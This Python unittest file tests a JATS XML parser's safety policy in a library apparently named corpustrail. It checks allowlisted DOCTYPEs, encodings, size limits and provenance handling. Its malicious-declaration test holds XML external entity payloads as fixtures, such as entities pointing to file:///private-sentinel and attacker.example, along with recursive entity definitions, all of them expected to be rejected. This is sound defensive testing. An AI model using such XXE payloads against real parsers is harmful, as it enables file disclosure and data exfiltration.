"""Synthetic inert-JATS compatibility, instrumented no-I/O and trust boundaries."""
import builtins
import codecs
from contextlib import ExitStack
import io
from pathlib import Path
import socket
import tempfile
import unittest
from unittest.mock import patch
import urllib.request

from corpustrail._internal import xml_safety as xml
from corpustrail._internal.values import digest_bytes
from corpustrail._internal.pipeline import artifact
from corpustrail.evidence.service import _document_ids
from corpustrail.identity import BibliographicRecord, Identifier, SourceReference
from corpustrail.project import Project, ProjectConfig

PUBLIC = '-//NLM//DTD JATS (Z39.96) Journal Archiving and Interchange DTD v1.3 20210610//EN'
SYSTEM = 'JATS-archivearticle1-3.dtd'
DOCTYPE = f'<!DOCTYPE article PUBLIC "{PUBLIC}" "{SYSTEM}">'
ARTICLE = ('<article><front><article-meta><article-id pub-id-type="pmc">PMC13558126</article-id>'
           '<article-id pub-id-type="pmid">42723954</article-id>'
           '<article-id pub-id-type="doi">10.3389/ebm.2026.11146</article-id>'
           '<abstract><p>Invented abstract.</p></abstract></article-meta></front>'
           '<body><sec><title>Methods</title><p>Invented measurement &amp; café.</p></sec></body></article>')
JATS = (DOCTYPE + ARTICLE).encode()


class JatsCompatibilityTests(unittest.TestCase):
    def no_io(self):
        stack = ExitStack()
        for target in ((builtins, 'open'), (io, 'open'), (socket.socket, 'connect'),
                       (urllib.request, 'urlopen'), (urllib.request.OpenerDirector, 'open')):
            stack.enter_context(patch.object(*target, side_effect=AssertionError('XML attempted prohibited I/O')))
        return stack

    def test_allowlisted_declarations_encodings_and_original_bytes(self):
        declarations = (DOCTYPE, DOCTYPE.replace(SYSTEM, 'https://jats.nlm.nih.gov/archiving/1.3/'+SYSTEM),
                        DOCTYPE.replace('DTD v', 'DTD with MathML3 v').replace('.dtd', '-mathml3.dtd'))
        for encoding, bom in (('utf-8', b''), ('utf-8', codecs.BOM_UTF8), ('utf-16-le', b''),
                              ('utf-16-le', codecs.BOM_UTF16_LE), ('utf-16-be', codecs.BOM_UTF16_BE),
                              ('iso-8859-1', b''), ('ascii', b'')):
            for declaration in declarations:
                label = 'UTF-16' if encoding.startswith('utf-16') else encoding
                raw = bom + ('<?xml version="1.0" encoding="'+label+'"?>'+declaration+ARTICLE).encode(encoding, errors='xmlcharrefreplace')
                before = digest_bytes(raw)
                with self.subTest(encoding=encoding, declaration=declaration), self.no_io():
                    root = xml.parse_xml(raw)
                    self.assertEqual(root.tag, 'article')
                    self.assertIn(('pmcid', 'PMC13558126'), _document_ids(raw))
                    self.assertIn('café', ''.join(root.itertext()))
                self.assertEqual(digest_bytes(raw), before)

    def test_malicious_declarations_and_entities_no_io(self):
        declarations = (
            '<!DOCTYPE article>', '<!DOCTYPE article SYSTEM "file:///private-sentinel">',
            '<!DOCTYPE article SYSTEM "https://127.0.0.1/private-sentinel">',
            DOCTYPE.replace(SYSTEM, 'file:///private-sentinel'),
            DOCTYPE.replace(SYSTEM, 'https://attacker.example/private.dtd'),
            DOCTYPE.replace(SYSTEM, '../'+SYSTEM), DOCTYPE.replace(SYSTEM, '//attacker.example/'+SYSTEM),
            DOCTYPE.replace(SYSTEM, 'https://jats.nlm.nih.gov.attacker.test/archiving/1.3/'+SYSTEM),
            DOCTYPE.replace('>', ' []>'), DOCTYPE.replace('>', ' [<!ENTITY e "expansion">]>'),
            DOCTYPE.replace('>', ' [<!ENTITY e SYSTEM "file:///private-sentinel">]>'),
            DOCTYPE.replace('>', ' [<!ENTITY e SYSTEM "https://attacker.example/secret">]>'),
            DOCTYPE.replace('>', ' [<!ENTITY % e SYSTEM "file:///private-sentinel">%e;]>'),
            DOCTYPE.replace('>', ' [<!ENTITY % e SYSTEM "https://attacker.example/secret">%e;]>'),
            DOCTYPE.replace('>', ' [<!ENTITY a "&a;">]>'),
            DOCTYPE.replace('>', ' [<!ENTITY a "ten"><!ENTITY b "&a;&a;&a;&a;">]>'),
            DOCTYPE.replace('>', ' [<!ATTLIST article secret CDATA "private">]>'),
            DOCTYPE.replace('>', ' [<!ELEMENT article ANY>]>'),
        )
        # A safe external subset does not make undeclared entities ignorable.
        payloads = [(d+ARTICLE).encode() for d in declarations]
        payloads += [(DOCTYPE+ARTICLE.replace('Invented measurement', '&external;')).encode(),
                     (DOCTYPE+ARTICLE.replace('<article>', '<article hidden="&external;">')).encode(),
                     (DOCTYPE+ARTICLE.replace('café', '&#0;')).encode()]
        for raw in payloads:
            with self.subTest(payload=payloads.index(raw)), self.no_io(), self.assertRaises(xml.XmlPolicyError):
                xml.parse_xml(raw)

    def test_malformed_multiple_misplaced_and_wrong_root(self):
        for value in (DOCTYPE[:-1]+ARTICLE, DOCTYPE+DOCTYPE+ARTICLE,
                      ARTICLE+DOCTYPE, '<article>'+DOCTYPE+'</article>',
                      DOCTYPE+'<other/>', DOCTYPE+'<article><p></article>',
                      DOCTYPE.replace('PUBLIC', 'PUBLICX')+ARTICLE,
                      DOCTYPE.replace('"'+SYSTEM+'"', SYSTEM)+ARTICLE):
            with self.subTest(value=value[:80]), self.no_io(), self.assertRaises(xml.XmlPolicyError):
                xml.parse_xml(value.encode())

    def test_parser_delimited_elision_preserves_comments_cdata_and_encodings(self):
        prefix = '<!-- café <!DOCTYPE fake SYSTEM "file:///marker"> --><?note <!DOCTYPE fake>?>\n'
        suffix = '<!-- trailing declaration-like text: <!DOCTYPE fake> -->'
        article = ARTICLE.replace('Invented measurement', '<![CDATA[<!DOCTYPE harmless>]]> Invented measurement')
        for encoding, bom in (('utf-8', codecs.BOM_UTF8), ('utf-16-le', b''),
                              ('utf-16-be', codecs.BOM_UTF16_BE), ('iso-8859-1', b'')):
            label = 'UTF-16' if encoding.startswith('utf-16') else encoding
            declaration = '<?xml version="1.0" encoding="'+label+'"?>'
            raw = bom+(declaration+prefix+DOCTYPE+article+suffix).encode(encoding)
            expected = bom+(declaration+prefix+article+suffix).encode(encoding)
            with self.subTest(encoding=encoding), self.no_io():
                root, provenance = xml.parse_xml(raw, with_provenance=True)
                self.assertIn('<!DOCTYPE harmless>', ''.join(root.itertext()))
                self.assertEqual(provenance['xml_parse_input_sha256'], digest_bytes(expected))

    def test_limits_and_old_expat_fail_closed(self):
        for limits, raw in (({'MAX_BYTES': 10}, JATS), ({'MAX_DEPTH': 2}, JATS),
                            ({'MAX_NODES': 2}, JATS), ({'MAX_TEXT': 2}, JATS),
                            ({'MAX_ATTRIBUTES': 1}, (DOCTYPE+'<article a="1" b="2"/>').encode()),
                            ({'MAX_ATTRIBUTE_TEXT': 2}, (DOCTYPE+'<article a="long"/>').encode())):
            with self.subTest(limits=limits), patch.multiple(xml, **limits), self.no_io(), self.assertRaises(xml.XmlPolicyError):
                xml.parse_xml(raw)
        with patch.object(xml.expat, 'version_info', (2, 5, 0)), self.assertRaises(xml.XmlPolicyError):
            xml.parse_xml(JATS)
        self.assertEqual(xml.parse_xml(ARTICLE.encode()).tag, 'article')
        for encoding in ('utf-32', 'utf-32-le', 'utf-32-be'):
            with self.subTest(encoding=encoding), self.no_io(), self.assertRaises(xml.XmlPolicyError):
                xml.parse_xml((DOCTYPE+ARTICLE).encode(encoding))

    def test_namespace_expansion_is_bounded_before_tree_allocation(self):
        for limits, raw in (({'MAX_NAMESPACE_URI': 8}, (DOCTYPE+'<article xmlns="urn:overlong-fixture"/>').encode()),
                            ({'MAX_NAME_TEXT': 32}, (DOCTYPE+'<article xmlns="urn:fixture"><a/><b/><c/></article>').encode())):
            with self.subTest(limits=limits), patch.multiple(xml, **limits), self.no_io(), self.assertRaises(xml.XmlPolicyError):
                xml.parse_xml(raw)
        with self.no_io():
            root = xml.parse_xml((DOCTYPE+ARTICLE.replace('<article>', '<article xmlns="urn:fixture">')).encode())
            self.assertEqual(root.tag, '{urn:fixture}article')

    def project(self, base):
        base = base.resolve()  # macOS temporary roots may use the /var alias.
        project = Project.create(base/'topic', ProjectConfig('synthetic-jats', 'Synthetic JATS', 'Invented scope'), created_by='fixture')
        source = SourceReference('fixture://record', 'record', digest_bytes(b'fixture'), 7,
                                 'fixture', '2026-01-01T00:00:00+00:00', identity_status='verified')
        record = BibliographicRecord('Invented JATS publication', identifiers=tuple(Identifier(*i) for i in
            (('pmcid','PMC13558126'), ('pmid','42723954'), ('doi','10.3389/ebm.2026.11146'))))
        pid = project.identities.apply(project.identities.plan(record, source), approve_new_identity=True, approve_aliases=True)
        return project, pid

    def preserve(self, project, pid, raw):
        return project.evidence.preserve_document(pid, raw, representation='jats_xml', media_type='application/xml',
            source_uri='fixture://jats', legitimate_basis='synthetic_fixture', resolver='fixture', resolver_version='v1')

    def test_exact_identity_body_and_new_policy_provenance(self):
        with tempfile.TemporaryDirectory() as temp:
            project, pid = self.project(Path(temp))
            self.preserve(project, pid, JATS)
            reps = project.evidence.representations(pid)
            self.assertEqual(project.evidence.status(pid)['best_available'], 'structured_text')
            self.assertEqual(artifact(project, reps[0]['payload']['artifact_sha256']).read_bytes(), JATS)
            self.assertEqual(reps[0]['payload']['xml_parse_input_sha256'], digest_bytes(ARTICLE.encode()))
            self.assertEqual(reps[0]['payload']['xml_parse_transformation'], 'expat-delimited-inert-doctype-elision/v1')
            self.assertTrue(all(r['payload']['xml_policy'] == 'bounded-inert-jats/v2' for r in reps))
            self.assertTrue(all(r['payload']['verification_version'] == 'exact-article-identifiers/v2' for r in reps))
            body = next(r for r in reps if r['payload']['representation']=='structured_text')['payload']
            self.assertEqual(body['evidence_depth'], 'document_body')
            self.assertEqual(body['parser_version'], 'corpustrail-native-jats/v3')
            self.assertEqual(project.reviews.history(pid), [])
            self.assertEqual(project.reviews.membership(pid)['state'], 'not_reviewed')

    def test_conflicts_malicious_content_and_prior_evidence_preserved(self):
        with tempfile.TemporaryDirectory() as temp:
            project, pid = self.project(Path(temp))
            self.preserve(project, pid, JATS)
            prior = project.evidence.representations(pid, trusted_only=True)
            observations = project.identities.observations(pid)
            for original, replacement in ((b'PMC13558126',b'PMC999'), (b'42723954',b'1'),
                                           (b'10.3389/ebm.2026.11146',b'10.1234/wrong')):
                self.preserve(project, pid, JATS.replace(original,replacement))
                self.assertEqual(project.evidence.representations(pid)[-1]['payload']['artifact_validity'], 'mismatch')
            for raw in (b'<article>', (DOCTYPE.replace('>', ' [<!ENTITY e "bad">]>')+ARTICLE).encode(),
                        (DOCTYPE+'<html/>').encode()):
                self.preserve(project, pid, raw)
                self.assertEqual(project.evidence.representations(pid)[-1]['payload']['artifact_validity'], 'invalid')
            self.assertEqual(project.evidence.representations(pid, trusted_only=True), prior)
            self.assertEqual(project.identities.observations(pid), observations)
            self.assertEqual(project.reviews.history(pid), [])
            self.assertEqual(project.reviews.membership(pid)['state'], 'not_reviewed')

    def test_front_matter_and_reference_ids_do_not_establish_full_text(self):
        with tempfile.TemporaryDirectory() as temp:
            project, pid = self.project(Path(temp))
            front = ARTICLE[:ARTICLE.index('<body>')]+'</article>'
            self.preserve(project,pid,(DOCTYPE+front).encode())
            self.assertNotEqual(project.evidence.status(pid)['best_available'], 'structured_text')
            raw = (DOCTYPE+'<article><body><p>Unidentified text.</p></body><back><ref-list><ref>'
                   '<article-id pub-id-type="pmc">PMC13558126</article-id></ref></ref-list></back></article>').encode()
            self.preserve(project,pid,raw)
            self.assertEqual(project.evidence.representations(pid)[-1]['payload']['artifact_validity'], 'pending_identity')

    def test_historical_rejection_never_reclassified_on_reads(self):
        from corpustrail.evidence import service
        from corpustrail.errors import ContractError
        with tempfile.TemporaryDirectory() as temp:
            project, pid = self.project(Path(temp))
            with patch.object(service, 'POLICY_VERSION', 'bounded-no-dtd/v1'), patch.object(
                    service, '_document_ids', side_effect=ContractError('legacy refusal')):
                self.preserve(project,pid,JATS)
            before = project.evidence.representations(pid)
            files = {str(p.relative_to(project.root)):digest_bytes(p.read_bytes()) for p in project.root.rglob('*') if p.is_file()}
            self.assertEqual(before[0]['payload']['artifact_validity'], 'invalid')
            self.assertEqual(before[0]['payload']['xml_policy'], 'bounded-no-dtd/v1')
            self.assertEqual(project.evidence.status(pid)['best_available'], 'metadata')
            self.assertEqual(project.evidence.representations(pid), before)
            self.assertEqual(files,{str(p.relative_to(project.root)):digest_bytes(p.read_bytes()) for p in project.root.rglob('*') if p.is_file()})

